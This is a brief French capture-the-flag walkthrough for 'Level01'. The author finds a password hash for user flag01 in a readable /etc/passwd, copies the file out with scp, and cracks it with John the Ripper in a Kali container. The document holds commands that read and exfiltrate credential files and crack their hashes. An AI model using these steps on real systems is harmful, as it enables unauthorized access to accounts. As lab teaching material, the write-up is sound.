# Level01

Qui suis-je ?

	$ id
	uid=2001(level01) gid=2001(level01) groups=2001(level01),100(users)

Ou suis-je ?

	$ pwd
	/home/user/level01

	$ ls -la
	total 12
	dr-x------ 1 level01 level01  100 Mar  5  2016 .
	d--x--x--x 1 root    users    340 Aug 30  2015 ..
	-r-x------ 1 level01 level01  220 Apr  3  2012 .bash_logout
	-r-x------ 1 level01 level01 3518 Aug 30  2015 .bashrc
	-r-x------ 1 level01 level01  675 Apr  3  2012 .profile

Mes fichiers / Les fichiers du user cible

	$ find / -user level01
	(nothing)
	$ find / -user flag01
	(nothing)

Rien

***********************************************************

Casser le mot de passe du user ?

	$ ls -l /etc/shadow
	-rw-r----- 1 root shadow 4428 Mar  6  2016 /etc/shadow
	(no permissions)

	$ ls -l /etc/passwd
	-rw-r--r-- 1 root root 2477 Mar  5  2016 /etc/passwd
	(permissions good)

	$ cat /etc/passwd
	...
	flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
	...
	(there is one hashed password inside just for the user ... flag01)

On va download le fichier et le casser avec John The Ripper

	$ scp -P 4242 level01@127.0.0.1:/etc/passwd .

Container Docker Kali linux avec en volume le fichier passwd

	$ docker run --rm --privileged -v `pwd`:/Ressources -ti kalilinux/kali-linux-docker /bin/bash
	$ apt-get update && apt-get install john -y
	$ cd /Ressources
	$ john --show passwd
	...
	abcdefg          (flag01)
	...

On a le mot de passe

:checkered_flag:
